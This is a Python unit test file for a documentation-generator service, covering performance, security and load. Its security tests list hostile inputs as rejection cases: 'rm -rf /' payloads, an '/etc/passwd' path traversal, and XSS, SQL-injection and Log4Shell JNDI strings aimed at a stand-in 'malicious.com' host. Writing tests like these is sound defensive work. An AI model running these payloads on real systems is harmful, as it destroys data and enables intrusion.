import unittest
import time
import threading
from concurrent.futures import ThreadPoolExecutor
import requests
from unittest.mock import patch, Mock

# Try to import psutil but don't fail if not available
try:
    import psutil
    PSUTIL_AVAILABLE = True
except ImportError:
    PSUTIL_AVAILABLE = False

from server import create_app  # Add this import
from services.documentation_generator import DocumentationGenerator
from services.github_service import GitHubService
from services.azure_service import AzureService
from services.translator import TranslatorService

class TestPerformance(unittest.TestCase):
    def setUp(self):
        self.doc_generator = DocumentationGenerator()
        self.test_code = "def test(): pass"
        
    def test_concurrent_document_generation(self):
        """Test performance under concurrent documentation generation"""
        num_requests = 100
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            for _ in range(num_requests):
                futures.append(
                    executor.submit(self.doc_generator.generate, self.test_code, "python")
                )
            
            results = [f.result() for f in futures]
            
        execution_time = time.time() - start_time
        
        self.assertEqual(len(results), num_requests)
        self.assertLess(execution_time, 10.0)  # Should complete within 10 seconds
        
    def test_export_performance(self):
        """Test export performance for different formats"""
        doc = self.doc_generator.generate(self.test_code, "python")
        formats = ['markdown', 'html', 'json', 'pdf', 'docx']
        
        for format_type in formats:
            start_time = time.time()
            result = self.doc_generator.export_documentation(doc, format=format_type)
            execution_time = time.time() - start_time
            
            self.assertIsNotNone(result)
            self.assertLess(execution_time, 2.0)  # Each export should take < 2 seconds

class TestSecurity(unittest.TestCase):
    def setUp(self):
        self.doc_generator = DocumentationGenerator()
        self.github_service = GitHubService(validate_on_init=False)
        
    def test_code_injection_prevention(self):
        """Test prevention of code injection attempts"""
        test_cases = [
            """import os\nos.system('rm -rf /')""",
            """import subprocess\nsubprocess.call(['rm', '-rf', '/'])""",
            """import sys\nsys.modules['os'].system('rm -rf /')""",
            """__import__('os').system('rm -rf /')"""
        ]
        
        for malicious_code in test_cases:
            with self.subTest(code=malicious_code):
                with self.assertRaises(ValueError) as cm:
                    self.doc_generator.generate(malicious_code, "python")
                self.assertIn("malicious code detected", str(cm.exception).lower())

    @patch('services.github_service.requests.get')
    def test_github_token_security(self, mock_get):
        """Test secure handling of GitHub tokens"""
        mock_get.return_value.status_code = 401
        mock_get.return_value.raise_for_status.side_effect = requests.exceptions.HTTPError()
        
        with self.assertRaises(ValueError) as cm:
            self.github_service._validate_credentials()
        self.assertIn("invalid github credentials", str(cm.exception).lower())
        
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks"""
        doc = self.doc_generator.generate("def test(): pass", "python")
        with self.assertRaises(ValueError):
            self.doc_generator.export_documentation(
                doc, 
                format='pdf',
                output_file='../../../etc/passwd'
            )
            
    @patch('services.github_service.requests.get')
    def test_github_token_security(self, mock_get):
        """Test secure handling of GitHub tokens"""
        mock_get.return_value.status_code = 401
        
        with self.assertRaises(ValueError):
            self.github_service._validate_credentials()
            
    def test_input_sanitization(self):
        """Test input sanitization for documentation generation"""
        test_cases = [
            "<script>alert('xss')</script>",
            "'; DROP TABLE users; --",
            "${jndi:ldap://malicious.com/x}",
        ]
        
        for test_input in test_cases:
            doc = self.doc_generator.generate("def test(): pass", "python")
            result = self.doc_generator.export_documentation(doc, format='html')
            self.assertNotIn(test_input, result)

class TestLoad(unittest.TestCase):
    def setUp(self):
        self.app = create_app()
        self.app.config.update({
            'TESTING': True,
            'DEBUG': False,
            'AZURE_KEY': 'test_key',
            'AZURE_ENDPOINT': 'https://test.azure.com',
            'RATE_LIMIT_ENABLED': False  # Disable rate limiting for tests
        })

        # Mock services
        self.azure_service_mock = Mock()
        self.azure_service_mock.analyze_sentiment.return_value = {
            'status': 'success',
            'sentiment': 'positive',
            'confidence_scores': {
                'positive': 0.8,
                'neutral': 0.1,
                'negative': 0.1
            }
        }

        # Create patches
        self.patches = [
            patch('routes.api.azure_service', self.azure_service_mock),
            patch('utils.middleware.RateLimiter.is_allowed', return_value=True),
            patch('services.azure_service.AzureService.analyze_sentiment',
                  return_value=self.azure_service_mock.analyze_sentiment.return_value)
        ]
        
        # Start all patches
        for p in self.patches:
            p.start()

        self.client = self.app.test_client()
        self.ctx = self.app.app_context()
        self.ctx.push()

    def tearDown(self):
        self.ctx.pop()
        for p in self.patches:
            p.stop()

    def test_load_handling(self):
        """Comprehensive load testing"""
        # Reduce test parameters
        num_requests = 30  # Reduced from 50
        concurrent_users = 2  # Reduced from 3
        
        start_time = time.time()
        cpu_usage = []
        memory_usage = []
        response_times = []
        
        def monitor_resources():
            while time.time() - start_time < 60:  # Monitor for 60 seconds
                if PSUTIL_AVAILABLE:
                    cpu_usage.append(psutil.cpu_percent())
                    memory_usage.append(psutil.Process().memory_info().rss / 1024 / 1024)
                else:
                    # Placeholder values when psutil is not available
                    cpu_usage.append(0)
                    memory_usage.append(0)
                time.sleep(1)
                
        # Start resource monitoring
        monitor_thread = threading.Thread(target=monitor_resources)
        monitor_thread.start()
        
        def worker(request_count):
            local_times = []
            for _ in range(request_count):
                request_start = time.time()
                try:
                    response = self.client.post('/api/analyze',
                                           json={
                                               'code': 'def test(): pass',
                                               'language': 'python'
                                           })
                    if response.status_code != 200:
                        print(f"Response data: {response.get_json()}")
                        print(f"Azure mock called: {self.azure_service_mock.analyze_sentiment.called}")
                        print(f"Mock return value: {self.azure_service_mock.analyze_sentiment.return_value}")
                        raise AssertionError(f"Expected status 200, got {response.status_code}")
                    local_times.append(time.time() - request_start)
                    time.sleep(0.1)  # Small delay between requests
                except Exception as e:
                    print(f"Error details: {str(e)}")
                    raise  # Re-raise to fail the test with proper error
            return local_times
            
        # Execute load test with delays between batches
        with ThreadPoolExecutor(max_workers=concurrent_users) as executor:
            futures = []
            for i in range(concurrent_users):
                time.sleep(0.1)  # Delay between spawning workers
                futures.append(
                    executor.submit(worker, num_requests // concurrent_users)
                )
            
            for future in futures:
                response_times.extend(future.result())
                
        monitor_thread.join()
        
        # Calculate metrics
        avg_response_time = sum(response_times) / len(response_times)
        max_response_time = max(response_times)
        requests_per_second = len(response_times) / (time.time() - start_time)
        
        # Only validate system metrics if psutil is available
        if PSUTIL_AVAILABLE:
            avg_cpu = sum(cpu_usage) / len(cpu_usage)
            avg_memory = sum(memory_usage) / len(memory_usage)
            self.assertLess(avg_cpu, 80)  # CPU usage under 80%
            self.assertLess(avg_memory, 512)  # Memory usage under 512MB
        
        # Always validate response time metrics
        self.assertLess(avg_response_time, 0.5)  # Average response time under 500ms
        self.assertLess(max_response_time, 2.0)  # Max response time under 2s
        self.assertGreater(requests_per_second, 50)  # At least 50 RPS

if __name__ == '__main__':
    unittest.main()